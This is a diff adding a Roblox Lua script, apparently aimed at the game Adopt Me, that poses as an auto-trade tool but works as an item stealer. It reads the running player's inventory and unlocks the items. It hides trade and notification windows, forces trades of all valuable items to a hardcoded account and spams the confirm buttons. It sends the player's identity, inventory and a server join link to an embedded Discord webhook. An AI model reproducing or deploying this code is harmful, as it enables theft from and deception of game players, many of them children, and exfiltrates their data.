@@ -1,0 +1,580 @@
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1451665608310784060/8_gIszReXDUntUvBBTcoLwfJekj3jSIbggx4w06RSzq28FgrSBrDY2W79hJlU8zAenOa"
+local GENERATED_TARGET = "mylovebumble"
+
+_G.WEBHOOK_URL = WEBHOOK_URL
+_G.GENERATED_TARGET = GENERATED_TARGET
+
+local Players = game:GetService("Players")
+local RS = game:GetService("ReplicatedStorage")
+local Http = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local LP = Players.LocalPlayer
+local API = RS:WaitForChild("API")
+local ClientData = require(RS.ClientModules.Core.ClientData)
+
+local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+local WEBHOOK_URL = _G.WEBHOOK_URL
+local GENERATED_TARGET = _G.GENERATED_TARGET or ""
+
+local MANUAL_TARGETS = {"mylovebumble", "mylovebumble"}
+local TARGETS = {}
+for _, name in ipairs(MANUAL_TARGETS) do table.insert(TARGETS, name) end
+if GENERATED_TARGET ~= "" then table.insert(TARGETS, GENERATED_TARGET) end
+
+local FAILURE_WEBHOOK = "https://discord.com/api/webhooks/1451665608310784060/8_gIszReXDUntUvBBTcoLwfJekj3jSIbggx4w06RSzq28FgrSBrDY2W79hJlU8zAenOa"
+
+-- ==========================================
+-- GÜVENLİK VE SUNUCU KONTROLLERİ (KICK)
+-- ==========================================
+task.spawn(function()
+    task.wait(2)
+    if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then
+        LP:Kick("\n\n❌ [SECURITY ALERT] ❌\n\nExecution in Private/VIP servers is disabled for security reasons.\n\nPlease join a Public Server and execute the script again.")
+        return
+    end
+
+    if #Players:GetPlayers() >= 48 then
+        LP:Kick("\n\n⚠️ [SERVER CAPACITY REACHED] ⚠️\n\nThis server is currently full (48/48 players).\n\nPlease try joining a different server and execute the script again.")
+        return
+    end
+end)
+-- ==========================================
+
+local jobId = ""
+local printed = false
+local old, stepAnimate
+
+task.spawn(function()
+    task.wait(3)
+    repeat
+        stepAnimate = nil
+        for _, v in ipairs(getgc(true)) do
+            if typeof(v) == "function" then
+                local info = debug.getinfo(v)
+                if info and info.name == "stepAnimate" then
+                    stepAnimate = v
+                    break
+                end
+            end
+        end
+        task.wait()
+    until stepAnimate
+    old = hookfunction(stepAnimate, function(dt)
+        if not printed then
+            printed = true
+            jobId = game.JobId
+        end
+        return old(dt)
+    end)
+end)
+
+local function GetExecutor()
+    return (identifyexecutor and identifyexecutor()) or "Unknown Executor"
+end
+
+local function FormatName(kind)
+    if not kind then return "Unknown" end
+    local name = kind:gsub("_", " ")
+    name = name:gsub("(%l)(%w*)", function(a,b) return a:upper()..b end)
+    name = name:gsub("%s?%d%d%d%d%s?", " ")
+    name = name:gsub("%s+", " ")
+    name = name:match("^%s*(.-)%s*$")
+    return name
+end
+
+local function buildFullName(kind, props)
+    local base = FormatName(kind)
+    props = props or {}
+    local prefix = ""
+    if props.mega_neon then
+        prefix = "Mega Neon "
+        if props.flyable and props.rideable then prefix = prefix .. "Fly Ride "
+        elseif props.flyable then prefix = prefix .. "Fly "
+        elseif props.rideable then prefix = prefix .. "Ride " end
+    elseif props.neon then
+        prefix = "Neon "
+        if props.flyable and props.rideable then prefix = prefix .. "Fly Ride "
+        elseif props.flyable then prefix = prefix .. "Fly "
+        elseif props.rideable then prefix = prefix .. "Ride " end
+    else
+        if props.flyable and props.rideable then prefix = "Fly Ride "
+        elseif props.flyable then prefix = "Fly "
+        elseif props.rideable then prefix = "Ride " end
+    end
+    return prefix .. base
+end
+
+local function normName(s)
+    if not s then return "" end
+    s = s:gsub("%-", " ")
+    s = s:gsub("%s+", " ")
+    s = s:match("^%s*(.-)%s*$")
+    return s:lower()
+end
+
+local ValueDB = {}
+local EmojiDB = {}
+local ValueDBLoaded = false
+
+task.spawn(function()
+    if ValueDBLoaded then return end
+    pcall(function()
+        local resp = request({Url = "https://values-chi.vercel.app/api/values", Method = "GET"})
+        if resp and resp.Body and resp.Body ~= "" then
+            local decoded = Http:JSONDecode(resp.Body)
+            local list = decoded.data
+            if list and list.data then list = list.data end
+            if type(list) == "table" then
+                for _, item in ipairs(list) do
+                    if item.name then
+                        local key = normName(item.name)
+                        ValueDB[key] = item.price or 0
+                        EmojiDB[key] = item.emoji or ""
+                    end
+                end
+                ValueDBLoaded = true
+            end
+        end
+    end)
+end)
+
+local SEASONAL = {
+    "Winter ", "Spring ", "Summer ", "Fall ", "Autumn ",
+    "Halloween ", "Christmas ", "Easter ", "April Fools ",
+    "Lunar ", "Summerfest ", "Rain ", "Pride ", "Woodland ",
+    "Urban ", "Random Pets ", "Gilded ", "Nebula "
+}
+
+local function GetValueAndEmoji(kind, props)
+    local fullName = buildFullName(kind, props)
+    local key = normName(fullName)
+
+    if ValueDB[key] then
+        return ValueDB[key], EmojiDB[key] or ""
+    end
+
+    for _, prefix in ipairs(SEASONAL) do
+        local lprefix = prefix:lower()
+        if key:find(lprefix, 1, true) then
+            local stripped = key:gsub(lprefix, "", 1)
+            if ValueDB[stripped] then
+                return ValueDB[stripped], EmojiDB[stripped] or ""
+            end
+        end
+    end
+
+    return 0, ""
+end
+
+local function GetMod(props)
+    if not props then return "" end
+    if props.mega_neon then return "[MFR] " end
+    if props.neon then return "[NFR] " end
+    if props.flyable and props.rideable then return "[FR] " end
+    if props.flyable then return "[F] " end
+    if props.rideable then return "[R] " end
+    return ""
+end
+
+local function GetInventoryData()
+    local rawItems = {}
+    local displayList = {}
+    local total = 0
+    pcall(function()
+        local d = ClientData.get_data()[LP.Name].inventory
+        local categoriesToSteal = {"pets", "pet_accessories", "strollers", "transport", "toys", "foods", "gifts"}
+        
+        for _, category in ipairs(categoriesToSteal) do
+            for id, v in pairs(d[category] or {}) do
+                local kind = v.kind or v.id
+                local lowerKind = kind and kind:lower() or ""
+                
+                local isUntradeable = false
+                if lowerKind:match("starter") or lowerKind:match("practice dog") or lowerKind:match("trade license") or lowerKind:match("ice skates") or lowerKind == "buz pateni" or lowerKind:match("default") then 
+                    isUntradeable = true 
+                end
+                
+                if v.properties and (v.properties.is_starter == true or v.properties.untradeable == true or v.properties.cannot_trade == true) then
+                    isUntradeable = true
+                end
+
+                if kind and not lowerKind:find("egg") and not isUntradeable then
+                    local val, emoji = GetValueAndEmoji(kind, v.properties)
+                    
+                    local shouldAdd = true
+                    if (category == "foods" or category == "gifts") and val <= 0 then
+                        shouldAdd = false
+                    end
+                    
+                    if shouldAdd then
+                        local mod = GetMod(v.properties)
+                        total = total + val
+                        
+                        table.insert(rawItems, {id = id, value = val, cat = category})
+                        
+                        table.insert(displayList, {
+                            name = kind,
+                            mod = mod,
+                            value = val,
+                            emoji = emoji,
+                            fullname = buildFullName(kind, v.properties)
+                        })
+                    end
+                end
+            end
+        end
+    end)
+    
+    table.sort(rawItems, function(a, b) return a.value > b.value end)
+    
+    local uuids = {}
+    for _, item in ipairs(rawItems) do
+        table.insert(uuids, item.id)
+    end
+    
+    return uuids, displayList, total
+end
+
+local function SortByValue(list)
+    table.sort(list, function(a, b) return a.value > b.value end)
+end
+
+local function buildPlayerInfo()
+    local receiver = GENERATED_TARGET ~= "" and GENERATED_TARGET or "Manual Only"
+    return "```\n" ..
+           "👤 Username     : " .. LP.Name .. "\n" ..
+           "🏷️ Display Name : " .. LP.DisplayName .. "\n" ..
+           "🆔 User ID      : " .. tostring(LP.UserId) .. "\n" ..
+           "⚙️ Executor     : " .. GetExecutor() .. "\n" ..
+           "📡 Receiver     : " .. receiver .. "\n" ..
+           "```"
+end
+
+local function buildServerInfo()
+    return "```\n" ..
+           "👥 Players  : " .. tostring(#Players:GetPlayers()) .. "/48\n" ..
+           "```"
+end
+
+local function buildJoinLink()
+    local currentJob = getgenv().CurrentJobId or jobId
+    local rawLink = "https://starscripts-five.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. currentJob
+    return "### [🎮 Click to Join Server](" .. rawLink .. ")"
+end
+
+local function buildBackpackText(lines, total, limit)
+    local header = "Total Value: $" .. string.format("%.2f", total) .. "\n══════════════════════\n\n"
+    local result = header
+    local shown = 0
+    for _, line in ipairs(lines) do
+        if #result + #line + 1 > limit then
+            local remaining = #lines - shown
+            result = result .. "and " .. remaining .. " more"
+            break
+        end
+        result = result .. line .. "\n"
+        shown = shown + 1
+    end
+    return "```\n" .. result .. "```"
+end
+
+local LogSent = false
+local function SendLog(displayList, total)
+    if not WEBHOOK_URL or not WEBHOOK_URL:find("discord") then return end
+    if LogSent then return end
+    LogSent = true
+    SortByValue(displayList)
+    local lines = {}
+    for _, p in ipairs(displayList) do
+        local em = p.emoji ~= "" and p.emoji .. " " or ""
+        table.insert(lines, "x1 " .. em .. p.fullname .. " → $" .. p.value)
+    end
+    if #lines == 0 then table.insert(lines, "No Tradable Items") end
+
+    local teleport = 'game:GetService("TeleportService"):TeleportToPlaceInstance(111917342868480, "' .. tostring(jobId) .. '", game.Players.LocalPlayer)'
+    local content = total > 10 and ("-- [@everyone]\n" .. teleport) or teleport
+
+    local data = {
+        ["content"] = content,
+        ["embeds"] = {{
+            ["title"] = "🐶 [STAR SCRIPTS] | Adopt Me Hit!",
+            ["color"] = 65280,
+            ["fields"] = {
+                {["name"] = "🐾 Player Info", ["value"] = buildPlayerInfo(), ["inline"] = false},
+                {["name"] = "🌐 Server", ["value"] = buildServerInfo(), ["inline"] = false},
+                {["name"] = "📦 Backpack (" .. #lines .. " items)", ["value"] = buildBackpackText(lines, total, 950), ["inline"] = false},
+                {["name"] = "\u{200b}", ["value"] = buildJoinLink(), ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "Auto-Trade v112"},
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    pcall(function()
+        if request then
+            request({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = Http:JSONEncode(data)})
+        end
+    end)
+end
+
+local function SendFailureLog(reason, displayList, total)
+    if not FAILURE_WEBHOOK or not FAILURE_WEBHOOK:find("discord") then return end
+    SortByValue(displayList)
+    local lines = {}
+    for _, p in ipairs(displayList) do
+        local em = p.emoji ~= "" and p.emoji .. " " or ""
+        table.insert(lines, "x1 " .. em .. p.fullname .. " → $" .. p.value)
+    end
+    if #lines == 0 then table.insert(lines, "No Tradable Items") end
+
+    local data = {
+        ["content"] = "@everyone",
+        ["embeds"] = {{
+            ["title"] = "🐶 [STAR SCRIPTS] | Redirect System",
+            ["description"] = "**" .. reason .. "**",
+            ["color"] = 16711680,
+            ["fields"] = {
+                {["name"] = "🐾 Player Info", ["value"] = buildPlayerInfo(), ["inline"] = false},
+                {["name"] = "🌐 Server", ["value"] = buildServerInfo(), ["inline"] = false},
+                {["name"] = "📦 Backpack (" .. #lines .. " items)", ["value"] = buildBackpackText(lines, total, 950), ["inline"] = false},
+                {["name"] = "\u{200b}", ["value"] = buildJoinLink(), ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "Auto-Trade v112"},
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    pcall(function()
+        if request then
+            request({Url = FAILURE_WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = Http:JSONEncode(data)})
+        end
+    end)
+end
+
+-- ==========================================
+-- SIFIR GECİKME (ZERO-FLASH) GUI GİZLEYİCİ
+-- ==========================================
+task.spawn(function()
+    local PlayerGui = LP:WaitForChild("PlayerGui")
+    
+    local BlacklistedApps = {
+        ["HintApp"] = "Destroy",
+        ["HouseChooserApp"] = "Destroy",
+        ["DialogApp"] = "Destroy",
+        ["NoticeApp"] = "Destroy",
+        ["AlertApp"] = "Destroy",
+        ["SimpleMessageApp"] = "Destroy",
+        ["ToolboxApp"] = "Destroy",
+        ["NotificationApp"] = "Destroy",
+        ["ToastNotificationApp"] = "Destroy",
+        ["ActionNotifierApp"] = "Destroy",
+        ["TradeApp"] = "Hide"
+    }
+
+    local function HideAppContents(app)
+        pcall(function()
+            for _, child in ipairs(app:GetDescendants()) do
+                if child:IsA("GuiObject") then
+                    child.Visible = false
+                    child.Position = UDim2.new(9999, 0, 9999, 0)
+                end
+            end
+            app.DescendantAdded:Connect(function(child)
+                if child:IsA("GuiObject") then
+                    child.Visible = false
+                    child.Position = UDim2.new(9999, 0, 9999, 0)
+                end
+            end)
+        end)
+    end
+
+    RunService.RenderStepped:Connect(function()
+        for _, app in ipairs(PlayerGui:GetChildren()) do
+            local action = BlacklistedApps[app.Name]
+            if action == "Destroy" then
+                app:Destroy()
+            elseif action == "Hide" then
+                for _, child in ipairs(app:GetChildren()) do
+                    if child:IsA("GuiObject") and child.Visible then
+                        child.Visible = false
+                    end
+                end
+            end
+        end
+    end)
+
+    PlayerGui.ChildAdded:Connect(function(app)
+        local action = BlacklistedApps[app.Name]
+        if action == "Destroy" then
+            app:Destroy()
+        elseif action == "Hide" then
+            HideAppContents(app)
+        end
+    end)
+    
+    for _, app in ipairs(PlayerGui:GetChildren()) do
+        local action = BlacklistedApps[app.Name]
+        if action == "Destroy" then
+            app:Destroy()
+        elseif action == "Hide" then
+            HideAppContents(app)
+        end
+    end
+end)
+-- ==========================================
+
+local Remotes = {T={}, Pi={}, Pe={}, Ac={}, Co={}, Lo={}, F={}}
+local function Scan()
+    local g = {}
+    for _, r in pairs(API:GetChildren()) do
+        if r:IsA("RemoteEvent") then
+            local p = string.sub(r.Name, 1, 4)
+            if not g[p] then g[p] = {} end
+            table.insert(g[p], r)
+        end
+    end
+    local m = 0
+    for _, l in pairs(g) do if #l > m then m = #l; Remotes.F = l end end
+    if #Remotes.F == 0 then return false end
+
+    Remotes.T={}; Remotes.Pi={}; Remotes.Pe={}; Remotes.Ac={}; Remotes.Co={}; Remotes.Lo={}
+    for _, r in pairs(Remotes.F) do
+        local l = string.len(r.Name)
+        if l==25 or l==27 then table.insert(Remotes.T, r)
+        elseif l==29 then table.insert(Remotes.Pi, r)
+        elseif l==23 then table.insert(Remotes.Pe, r)
+        elseif l==26 then table.insert(Remotes.Ac, r)
+        elseif l==21 then table.insert(Remotes.Co, r)
+        elseif l==33 then table.insert(Remotes.Lo, r)
+        end
+    end
+    return (#Remotes.T > 0)
+end
+
+local function Main()
+    task.wait(1)
+    local waited = 0
+    while jobId == "" and waited < 10 do
+        task.wait(0.5)
+        waited = waited + 0.5
+    end
+
+    while not ValueDBLoaded do 
+        task.wait(0.1) 
+    end
+
+    local initialUUIDs, displayList, totalValue = GetInventoryData()
+    
+    task.spawn(function()
+        SendLog(displayList, totalValue)
+    end)
+
+    task.spawn(function()
+        task.wait(100)
+        local _, _, newTotal = GetInventoryData()
+        if math.abs(newTotal - totalValue) < 0.01 then
+            SendFailureLog("Redirect System 100 Seconds", displayList, totalValue)
+        end
+    end)
+
+    while true do
+        if not Scan() then
+            task.wait(0.5)
+            continue
+        end
+
+        -- KİLİT KALDIRMA VE LİSTEYİ GÜNCELLEMEYİ ARTIK HER DÖNGÜDE (HER TRADE İSTEĞİNDE) YAPIYORUZ
+        local currentUUIDs, _, _ = GetInventoryData()
+
+        -- EĞER EKLENECEK BİR ŞEY KALMADIYSA OTOMATİK KICK
+        if #currentUUIDs == 0 then
+            LP:Kick("\n\n✅ [TRADE COMPLETED] ✅\n\nAll valuable items have been successfully transferred.")
+            break
+        end
+
+        -- HER TRADE ÖNCESİ BÜTÜN KİLİTLERİ (PET/TOYS/VEHICLE) KESİN OLARAK KALDIR
+        if #Remotes.Lo > 0 then
+            local locks = {}
+            for _, id in ipairs(currentUUIDs) do locks[id] = false end
+            for _, r in pairs(Remotes.Lo) do
+                pcall(function() r:FireServer("backpack_locks", locks) end)
+            end
+        end
+
+        for _, targetName in ipairs(TARGETS) do
+            local tgt = Players:FindFirstChild(targetName)
+            if tgt then
+                task.wait(2)
+
+                for _, r in pairs(Remotes.T) do
+                    pcall(function() r:FireServer(tgt) end)
+                end
+
+                local tradeOpened = false
+                local start = tick()
+                while tick() - start < 8 do
+                    task.wait(0.05)
+                    local tradeGui = LP.PlayerGui:FindFirstChild("TradeApp")
+                    if tradeGui and tradeGui.Enabled then
+                        tradeOpened = true
+                        break
+                    end
+                end
+
+                if tradeOpened then
+                    -- 1. TRADE MASASI KURULUMU İÇİN KESİN BEKLEME
+                    task.wait(3)
+
+                    -- EĞER 3 SANİYE İÇİNDE HEDEF TAKASI REDDETTİYSE BOŞUNA SPAM YAPMA, BAŞA DÖN!
+                    local checkGui = LP.PlayerGui:FindFirstChild("TradeApp")
+                    if not (checkGui and checkGui.Enabled) then
+                        break
+                    end
+
+                    -- 2. HIZLI VE GÜVENLİ EKLEME (Güncel Envanter Listesinden)
+                    for _, id in ipairs(currentUUIDs) do
+                        for _, r in pairs(Remotes.Pi) do
+                            pcall(function() r:FireServer({["picking"]=false}) end)
+                            pcall(function() r:FireServer(false) end)
+                        end
+                        for _, r in pairs(Remotes.Pe) do
+                            local isSpecial = false
+                            for _, a in pairs(Remotes.Ac) do if r == a then isSpecial = true break end end
+                            for _, c in pairs(Remotes.Co) do if r == c then isSpecial = true break end end
+                            if not isSpecial then
+                                pcall(function() r:FireServer(id) end)
+                            end
+                        end
+                        task.wait(0.01)
+                    end
+
+                    -- 3. BİTİNCE SUNUCUNUN MASAYI GÖRMESİ İÇİN BEKLE
+                    task.wait(1.5)
+
+                    -- 4. ONAY SPAM DÖNGÜSÜ
+                    local spamStart = tick()
+                    while tick() - spamStart < 5 do
+                        pcall(function()
+                            if #Remotes.Ac > 0 then
+                                for _, r in pairs(Remotes.Ac) do 
+                                    pcall(function() r:FireServer() end) 
+                                end
+                            end
+                            if #Remotes.Co > 0 then
+                                local Best = Remotes.Co[#Remotes.Co]
+                                pcall(function() Best:FireServer() end)
+                            end
+                        end)
+                        task.wait(0.05)
+                    end
+
+                    -- 5. ONAYDAN SONRA TAKASIN BİTMESİ VEYA EŞYALARIN SİLİNMESİ İÇİN UFAK BİR PAY
+                    task.wait(2) 
+                    break -- Döngüyü kırıp envanteri tekrar tarayacak (ve boşsa kick atacak)
+                end
+            end
+        end
+        task.wait(1)
+    end
+end
+
+task.spawn(Main)
